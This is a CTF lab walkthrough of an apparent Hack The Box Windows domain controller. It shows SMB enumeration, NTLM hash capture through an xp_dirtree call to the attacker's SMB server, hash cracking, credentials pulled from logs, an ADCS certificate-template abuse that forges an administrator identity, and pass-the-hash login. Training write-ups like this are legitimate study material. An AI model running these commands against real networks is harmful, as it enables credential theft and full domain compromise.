```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-28 19:27 EDT
Nmap scan report for 10.10.11.202
Host is up (0.025s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-29 07:29:59Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         Microsoft Windows RPC
49711/tcp open  msrpc         Microsoft Windows RPC
49730/tcp open  msrpc         Microsoft Windows RPC
49749/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

has a ton of rpc port open.... i am gonna try running enum4linux:
`enum4linux-ng 10.10.11.202`
```
...
 Long domain name is: sequel.htb
 ...
 [*] Check for null session
[+] Server allows session using username '', password ''
...
OS: Windows 10, Windows Server 2019, Windows Server 2016
OS version: '10.0'
OS release: '1809'
OS build: '17763'
```

we got a lot of useful info out of this! 

Now that we know we can get in smb anonymously:
`smbclient -L \\10.10.11.202\\ -N`
```                                     
	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	Public          Disk      
	SYSVOL          Disk      Logon server share 
```

let get in there!
`smbclient \\\\10.10.11.202\\Public -N`
```
s
  .                                   D        0  Sat Nov 19 06:51:25 2022
  ..                                  D        0  Sat Nov 19 06:51:25 2022
  SQL Server Procedures.pdf           A    49551  Fri Nov 18 08:39:43 2022
```

:ALARM: 

lets take a look at this pdf and the metadata!

taking a look:
![[Pasted image 20250728194320.png]]
We get low level access creds:
`PublicUser: GuestUserCantWrite1`

```
impacket-mssqlclient PublicUser@10.10.11.202 -windows-auth
# ❌ this will FAIL — you want SQL auth

impacket-mssqlclient PublicUser:GuestUserCantWrite1@10.10.11.202
```
WE ARE IN!
```
SELECT name FROM sys.databases;
name     
------   
master   

tempdb   

model    

msdb     
```

ok going through the steps our next step is:
```
What user is the MSSQL instance running as?

Hint:
Get the MSSQL server to read a file from an SMB host you control, and watch for the authentication.
```

i remember doing this in oscp:
`sudo impacket-smbserver loot $(pwd) -smb2support`

then on the MSSQL server:
`EXEC xp_dirtree '\\10.10.14.3\share'`

BANG:
```
Incoming connection (10.10.11.202,51879)
[*] AUTHENTICATE_MESSAGE (sequel\sql_svc,DC)
[*] User DC\sql_svc authenticated successfully
[*] sql_svc::sequel:aaaaaaaaaaaaaaaa:8c9638747e7fbba9e07e1de6d01069d3:010100000000000000c405ed1a00dc018ce56915125f9b8e0000000001001000760070004100490078004b006500660003001000760070004100490078004b00650066000200100055006c00590066006a007400710044000400100055006c00590066006a007400710044000700080000c405ed1a00dc010600040002000000080030003000000000000000000000000030000003e2c98b1e0e2946223517f9b98139541cca9c806e2b6cabaee5236d9bc8bb150a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e0033000000000000000000
[*] Closing down connection (10.10.11.202,51879)
```

catch a hash of user `sql_svc`!

let crack it:
```
echo 'sql_svc::sequel:aaaaaaaaaaaaaaaa:8c9638747e7fbba9e07e1de6d01069d3:010100000000000000c405ed1a00dc018ce56915125f9b8e0000000001001000760070004100490078004b006500660003001000760070004100490078004b00650066000200100055006c00590066006a007400710044000400100055006c00590066006a007400710044000700080000c405ed1a00dc010600040002000000080030003000000000000000000000000030000003e2c98b1e0e2946223517f9b98139541cca9c806e2b6cabaee5236d9bc8bb150a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e0033000000000000000000' > sql_svc_hash.txt
```

`hashcat -m 5600 sql_svc_hash.txt /usr/share/wordlists/rockyou.txt --force `
5600 is ntlmv2
CRACKED:
`sql_svc:REGGIE1234ronnie`

lets now login as sql_svc and see what we can find:
`impacket-mssqlclient sql_svc:REGGIE1234ronnie@10.10.11.202`

oh...
```
impacket-mssqlclient sequel/sql_svc:REGGIE1234ronnie@10.10.11.202
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[-] ERROR(DC\SQLMOCK): Line 1: Login failed for user 'sql_svc'.
```
..... a little stuck i check hint:
```
What is the Ryan.Cooper user's password?

Hint:
Enumerate the SQLServer logs. It seems Ryan entered a password as a username at least once.
```
:D

Only problem is i cant get in as sql_svc!

```
crackmapexec mssql 10.10.11.202 -u sql_svc -p 'REGGIE1234ronnie'

MSSQL       10.10.11.202    1433   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:sequel.htb)
MSSQL       10.10.11.202    1433   DC               [-] sequel.htb\sql_svc:REGGIE1234ronnie name 'logging' is not defined
```

wtffff
lets change service we are attacking, these are valid creds so maybe we can get in via winrm:
`evil-winrm -i 10.10.11.202 -u sql_svc -p 'REGGIE1234ronnie'`

easy as pie!
`*Evil-WinRM* PS C:\Users\sql_svc\Documents> `

and there she is in `C:\SQLServer\Logs\ERRORLOG.BAK`
```
...
2022-11-18 13:43:07.44 Logon       Logon failed for user 'sequel.htb\Ryan.Cooper'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
2022-11-18 13:43:07.48 Logon       Error: 18456, Severity: 14, State: 8.
2022-11-18 13:43:07.48 Logon       Logon failed for user 'NuclearMosquito3'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
...
```
what a password!

Now that we have Ryan.Cooper creds:
`Ryan.Cooper:NuclearMosquito3`
lets try winrm with him!

`evil-winrm -i 10.10.11.202 -u Ryan.Cooper -p 'NuclearMosquito3'`

indeed it did!

PWNED  Ryan and got user.txt on his desktop

---
#### PRIV ESC

Ok off with a hint:
```
What is the name of the vulnerable ADCS template on Escape?

Hint:
Try a tool like [Certify](https://github.com/GhostPack/Certify) or [Certipy](https://github.com/ly4k/Certipy) to enumerate ADCS.
```

`https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x86/Certify.exe`

download and uploaded it to target via winrm:
`upload Certify.exe`

run:
`.\Certify.exe find /vulnerable`

```
Listing info about the Enterprise CA 'sequel-DC-CA'

    Enterprise CA Name            : sequel-DC-CA
    DNS Hostname                  : dc.sequel.htb
    FullName                      : dc.sequel.htb\sequel-DC-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=sequel-DC-CA, DC=sequel, DC=htb
    Cert Thumbprint               : A263EA89CAFE503BB33513E359747FD262F91A56
    Cert Serial                   : 1EF2FA9A7E6EADAD4F5382F4CE283101
    Cert Start Date               : 11/18/2022 12:58:46 PM
    Cert End Date                 : 11/18/2121 1:08:46 PM
    Cert Chain                    : CN=sequel-DC-CA,DC=sequel,DC=htb
    UserSpecifiedSAN              : Disabled
    CA Permissions                :
      Owner: BUILTIN\Administrators        S-1-5-32-544

      Access Rights                                     Principal

      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
      Allow  ManageCA, ManageCertificates               sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
      Allow  ManageCA, ManageCertificates               sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
    Enrollment Agent Restrictions : None

[!] Vulnerable Certificates Templates :

    CA Name                               : dc.sequel.htb\sequel-DC-CA
    Template Name                         : UserAuthentication
    Schema Version                        : 2
    Validity Period                       : 10 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
    Permissions
      Enrollment Permissions
        Enrollment Rights           : sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Domain Users           S-1-5-21-4078382237-1492182817-2568127209-513
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
      Object Control Permissions
        Owner                       : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
        WriteOwner Principals       : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
        WriteDacl Principals        : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
        WriteProperty Principals    : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519


Certify completed in 00:00:12.9143116
```

must say i have never used this before so i have to do some research.... brb

OK so the vuln ADCS template is UserAuthentication, with that being said we should be able to:
- Request a forged certificate
    
- Use it to get a TGT (Kerberos ticket)
    
- Dump secrets or pwn SYSTEM

but certify cant do this we need to use certpy:
```
certipy-ad req -u ryan.cooper@sequel.htb -p '' \
-ca sequel-DC-CA -template UserAuthentication \
-on-behalf-of administrator@sequel.htb \
-dc-ip 10.10.11.202 \
-out administrator

Certipy v5.0.2 - by Oliver Lyak (ly4k)

[-] A certificate and private key (-pfx) is required for on-behalf-of requests
```

hmmmmm let me restart and see if certpy will help me get a cert from jump for ryan...
`source certenv/bin/activate`

`pip install certipy-ad`

```
certipy find \
    -u 'ryan.cooper@sequel.htb' -p 'NuclearMosquito3' \
    -dc-ip '10.10.11.202' -text
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 15 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'sequel-DC-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'sequel-DC-CA'
[*] Checking web enrollment for CA 'sequel-DC-CA' @ 'dc.sequel.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Saving text output to '20250728213107_Certipy.txt'
[*] Wrote text output to '20250728213107_Certipy.txt'
```
Nothing in there as far as i can tell.....
lets try getting ryan's cert and then req admin cert:
```
certipy req -u ryan.cooper@sequel.htb -p 'NuclearMosquito3' \
-ca sequel-DC-CA -template UserAuthentication -out ryan -dc-ip 10.10.11.202

Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 13
[*] Successfully requested certificate
[*] Got certificate without identity
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'ryan.pfx'
[*] Wrote certificate and private key to 'ryan.pfx'
```

```
certipy req -pfx ryan.pfx -on-behalf-of administrator@sequel.htb \
-ca sequel-DC-CA -template UserAuthentication -out administrator -dc-ip 10.10.11.202

Certipy v5.0.3 - by Oliver Lyak (ly4k)

[-] Username is not specified
[*] Requesting certificate via RPC
[*] Request ID is 0
[-] Got unknown error while requesting certificate: (unknown error code: 0x1): 
Would you like to save the private key? (y/N): y
[*] Saving private key to 'administrator.key'
[*] Wrote private key to 'administrator.key'
[-] Failed to request certificate
```

this failed tho, need to go thru more to understand how i can use ryan to get admin hash....

ah-ha!
```
certipy req -u ryan.cooper@sequel.htb -p 'NuclearMosquito3' \
-ca sequel-DC-CA -template UserAuthentication \
-upn administrator@sequel.htb -dc-ip 10.10.11.202 -out admin

Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 15
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@sequel.htb'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'admin.pfx'
[*] Wrote certificate and private key to 'admin.pfx'
```
then:
```
certipy auth -pfx 'admin.pfx' -dc-ip '10.10.11.202'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@sequel.htb'
[*] Using principal: 'administrator@sequel.htb'
[*] Trying to get TGT...
[-] Got error while trying to request TGT: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
[-] Use -debug to print a stacktrace
[-] See the wiki for more information
```

looks like i need to sync my time to our targets....
```
sudo ntpdate -u 10.10.11.202

2025-07-29 05:54:14.081965 (-0400) +28800.251691 +/- 0.010795 10.10.11.202 s1 no-leap
CLOCK: time stepped by 28800.251691
```

try once more:
BOOM!
```
certipy auth -pfx 'admin.pfx' -dc-ip '10.10.11.202'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@sequel.htb'
[*] Using principal: 'administrator@sequel.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee
```
ntlm hash is after the :
`a52f78e4c751e5f5e17e1e9f3e58f4ee`

finally lets get root and PWN this machine:
`evil-winrm -i 10.10.11.202 -u Administrator -H 'a52f78e4c751e5f5e17e1e9f3e58f4ee'`

```
PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        7/28/2025  11:57 PM             34 root.txt
```

PWNED!